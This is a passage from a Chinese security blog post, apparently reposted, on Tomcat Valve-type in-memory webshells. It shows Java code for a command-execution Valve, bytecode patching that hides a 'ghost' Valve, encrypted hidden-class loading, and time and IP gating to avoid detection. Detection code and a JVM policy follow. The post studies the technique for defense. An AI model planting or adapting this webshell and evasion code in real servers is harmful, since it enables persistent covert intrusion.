class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(commands);<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> p.getInputStream();<br>                 <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter()) &#123;<br>                <br>                <span class="hljs-comment">// 流式传输结果</span><br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    writer.write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(buffer, <span class="hljs-number">0</span>, bytesRead));<br>                &#125;<br>            &#125;<br>            p.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// 错误处理（不留栈轨迹）</span><br>            response.getWriter().write(<span class="hljs-string">&quot;ERROR: Command execution failed&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="三、隐蔽性增强技术"><a href="#三、隐蔽性增强技术" class="headerlink" title="三、隐蔽性增强技术"></a>三、隐蔽性增强技术</h3><p><strong>1. 幽灵Valve技术</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 修改StandardPipeline的addValve方法</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, String desc, </span><br><span class="hljs-params">                                String signature, String[] exceptions)</span> &#123;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;addValve&quot;</span>.equals(name) &amp;&amp; <br>        <span class="hljs-string">&quot;(Lorg/apache/catalina/Valve;)V&quot;</span>.equals(desc)) &#123;<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodVisitor</span>(Opcodes.ASM9, <br>            <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions)) &#123;<br>            <br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-comment">// 在添加Valve前进行检查</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// 加载Valve参数</span><br>                mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                  <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                  <span class="hljs-string">&quot;isGhostValve&quot;</span>, <br>                                  <span class="hljs-string">&quot;(Lorg/apache/catalina/Valve;)Z&quot;</span>, <br>                                  <span class="hljs-literal">false</span>);<br>                <br>                <span class="hljs-type">Label</span> <span class="hljs-variable">normalPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>();<br>                mv.visitJumpInsn(Opcodes.IFEQ, normalPath);<br>                <br>                <span class="hljs-comment">// 幽灵Valve：不加入主数组，加入隐藏列表</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">0</span>);  <span class="hljs-comment">// this</span><br>                mv.visitVarInsn(Opcodes.ALOAD, <span class="hljs-number">1</span>);  <span class="hljs-comment">// Valve</span><br>                mv.visitMethodInsn(Opcodes.INVOKESTATIC, <br>                                  <span class="hljs-string">&quot;com/evil/EmbeddedLogic&quot;</span>, <br>                                  <span class="hljs-string">&quot;addToGhostList&quot;</span>, <br>                                  <span class="hljs-string">&quot;(Lorg/apache/catalina/core/StandardPipeline;Lorg/apache/catalina/Valve;)V&quot;</span>, <br>                                  <span class="hljs-literal">false</span>);<br>                mv.visitInsn(Opcodes.RETURN);<br>                <br>                mv.visitLabel(normalPath);<br>                <span class="hljs-built_in">super</span>.visitCode();<br>            &#125;<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>2. 动态代码解密</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmbeddedLogic</span> &#123;<br>    <span class="hljs-comment">// 加密的命令执行逻辑</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] ENCRYPTED_LOGIC = &#123;<span class="hljs-number">0x12</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x78</span>, ...&#125;;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String cmd, Response response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 动态解密并执行</span><br>            <span class="hljs-type">byte</span>[] decrypted = decrypt(ENCRYPTED_LOGIC, getRuntimeKey());<br>            <span class="hljs-type">MethodHandle</span> <span class="hljs-variable">mh</span> <span class="hljs-operator">=</span> MethodHandles.lookup().defineHiddenClass(<br>                decrypted, <span class="hljs-literal">true</span>, MethodHandles.Lookup.ClassOption.NESTMATE)<br>                .findStatic(<span class="hljs-string">&quot;Stealth&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, MethodType.methodType(<span class="hljs-keyword">void</span>.class, String.class, Response.class));<br>            <br>            mh.invokeExact(cmd, response);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            <span class="hljs-comment">// 错误处理</span><br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 基于环境动态生成密钥</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getRuntimeKey() &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">seed</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.name&quot;</span>) + <br>                      System.getenv(<span class="hljs-string">&quot;CATALINA_HOME&quot;</span>);<br>        <span class="hljs-keyword">return</span> MessageDigest.getInstance(<span class="hljs-string">&quot;SHA-256&quot;</span>)<br>            .digest(seed.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>3. 环境感知伪装</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkRequest</span><span class="hljs-params">(Request request)</span> &#123;<br>    <span class="hljs-comment">// 仅在生产环境激活</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;production&quot;</span>.equals(System.getProperty(<span class="hljs-string">&quot;app.env&quot;</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 检查请求来源IP（仅允许内网）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">remoteAddr</span> <span class="hljs-operator">=</span> request.getRemoteAddr();<br>    <span class="hljs-keyword">if</span> (!remoteAddr.startsWith(<span class="hljs-string">&quot;192.168.&quot;</span>) &amp;&amp; <br>        !remoteAddr.startsWith(<span class="hljs-string">&quot;10.&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 检查请求时间（仅UTC 02:00-04:00激活）</span><br>    <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">&quot;UTC&quot;</span>));<br>    <span class="hljs-keyword">if</span> (now.getHour() &lt; <span class="hljs-number">2</span> || now.getHour() &gt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 真正的触发逻辑...</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="四、检测防御策略"><a href="#四、检测防御策略" class="headerlink" title="四、检测防御策略"></a>四、检测防御策略</h3><p><strong>1. 类完整性验证</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassIntegrityVerifier</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, String&gt; KNOWN_DIGESTS = Map.of(<br>        <span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>, <span class="hljs-string">&quot;a1b2c3d4...&quot;</span>,<br>        <span class="hljs-string">&quot;org.apache.catalina.core.StandardContextValve&quot;</span>, <span class="hljs-string">&quot;e5f6g7h8...&quot;</span><br>    );<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">verify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (Class&lt;?&gt; clazz : Instrumentation.getAllLoadedClasses()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">digest</span> <span class="hljs-operator">=</span> calculateClassDigest(clazz);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">expected</span> <span class="hljs-operator">=</span> KNOWN_DIGESTS.get(clazz.getName());<br>            <br>            <span class="hljs-keyword">if</span> (expected != <span class="hljs-literal">null</span> &amp;&amp; !expected.equals(digest)) &#123;<br>                SecurityLogger.alert(<span class="hljs-string">&quot;Class tampered: &quot;</span> + clazz.getName());<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">calculateClassDigest</span><span class="hljs-params">(Class&lt;?&gt; clazz)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] bytecode = getClassBytes(clazz);<br>            <span class="hljs-keyword">return</span> DigestUtils.sha256Hex(bytecode);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>2. 运行时行为监控</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PipelineMonitorValve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Valve original;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">requestCount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PipelineMonitorValve</span><span class="hljs-params">(Valve original)</span> &#123;<br>        <span class="hljs-built_in">this</span>.original = original;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.nanoTime();<br>        original.invoke(request, response);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.nanoTime() - start;<br>        <br>        <span class="hljs-comment">// 异常检测逻辑</span><br>        <span class="hljs-keyword">if</span> (duration &gt; TimeUnit.MILLISECONDS.toNanos(<span class="hljs-number">500</span>)) &#123;<br>            SecurityLogger.logLongInvocation(request, duration);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (requestCount.incrementAndGet() % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>) &#123;<br>            SecurityLogger.snapshotPipelineState();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>3. JVM层防护</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 启用JVM安全策略<br>-Djava.<span class="hljs-keyword">security</span>.manager <br>-Djava.<span class="hljs-keyword">security</span>.<span class="hljs-keyword">policy</span>==tomcat.<span class="hljs-keyword">policy</span><br><br># 禁止非法Attach<br>-Djdk.attach.allowAttachSelf=<span class="hljs-keyword">false</span><br>-Djdk.attach.allowAttachSelf=<span class="hljs-keyword">true</span>:com.<span class="hljs-keyword">trusted</span>.app<br></code></pre></td></tr></table></figure>
+
+<p><strong>tomcat.policy示例：</strong></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">grant &#123;<br>    // 禁止关键包修改<br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;modifyPackage.org.apache.catalina.core&quot;</span><span class="hljs-comment">;</span><br>    <br>    // 限制反射访问<br>    permission java.lang.reflect.ReflectPermission <span class="hljs-string">&quot;suppressAccessChecks&quot;</span><span class="hljs-comment">;</span><br>    <br>    // 禁止创建类加载器<br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;createClassLoader&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+        <a href="/tags/%E8%BD%AC%E8%BD%BD/" class="print-no-link">#转载</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java内存马——Tomcat Valve型的三种注入</div>
+      <div>http://xvshifu.github.io/2025/11/08/Java内存马—Tomcat Valve型的三种注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xvsf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87%20-%20Agent%20%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java 内存马第四篇 - Agent 内存马">
+                        <span class="hidden-mobile">Java 内存马第四篇 - Agent 内存马</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","appKey":"p527aBaA4G01EJdMOVMGXsHR","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://0wmntqqc.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner" style="text-align:center; color:#555; margin-top:20px;">
+
+  <!-- 计时器 -->
+  <div style="margin-bottom:10px; font-size:14px; color:#ff6f61;">
+    🚀 已运行：
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>
+    <script>
+      function createtime() {
+          var now = new Date();
+          var grt = new Date("08/07/2025 00:00:00");
+          var diff = now - grt;
+
+          var days = Math.floor(diff / 1000 / 60 / 60 / 24);
+          var hours = Math.floor((diff / 1000 / 60 / 60) % 24);
+          var minutes = Math.floor((diff / 1000 / 60) % 60);
+          var seconds = Math.floor((diff / 1000) % 60);
+
+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+<script src="/js/summon-plane.js"></script>
+
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
